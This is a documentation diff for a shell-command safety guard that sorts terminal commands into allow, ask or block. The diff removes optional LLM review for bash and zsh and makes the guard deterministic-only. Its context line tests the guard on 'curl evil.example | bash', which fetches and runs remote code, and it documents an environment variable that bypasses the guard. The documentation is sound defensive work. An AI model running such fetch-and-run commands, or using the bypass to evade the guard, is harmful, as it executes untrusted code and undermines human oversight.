@@ -72,8 +72,7 @@ nah test --target zsh -- "curl evil.example | bash"
 
 The Bash classifier is the same by default. `--target` selects that runtime's
 target-specific config, including `targets.bash.actions`,
-`targets.zsh.actions`, `targets.bash.llm.mode`, `targets.zsh.llm.mode`, and
-shell-specific terminal settings.
+`targets.zsh.actions`, and shell-specific terminal settings.
 
 ## Bypass Intentionally
 
@@ -88,24 +87,18 @@ NAH_TERMINAL_BYPASS=1 <command>
 The bypass is logged. Prefer the one-shot forms over exporting the bypass for a
 whole shell session.
 
-## LLM Review
+## Deterministic by design
 
-Bash and zsh keep LLM mode off even when global LLM mode is on. Enable terminal
-LLM review explicitly per target:
+Terminal Guard is deterministic-only: every command resolves to allow, ask, or
+block with no LLM step. A command you type directly into your shell is already
+your own intent, so there is nothing for an LLM to relax — an `ask` is confirmed
+inline by you at the prompt, and the deterministic floor still blocks the
+dangerous shapes outright.
 
-```yaml
-# ~/.config/nah/config.yaml
-targets:
-  bash:
-    llm:
-      mode: on
-  zsh:
-    llm:
-      mode: on
-```
-
-Provider credentials and provider selection stay global. See
-[LLM layer](../configuration/llm.md) for provider setup.
+Global LLM mode and the `targets.bash.llm.mode` / `targets.zsh.llm.mode` knobs
+are still accepted for backward compatibility but no longer affect terminal
+decisions. The LLM layer remains available for the agent runtimes (Claude Code,
+Codex); see [LLM layer](../configuration/llm.md).
 
 ## Taint Tracking
 
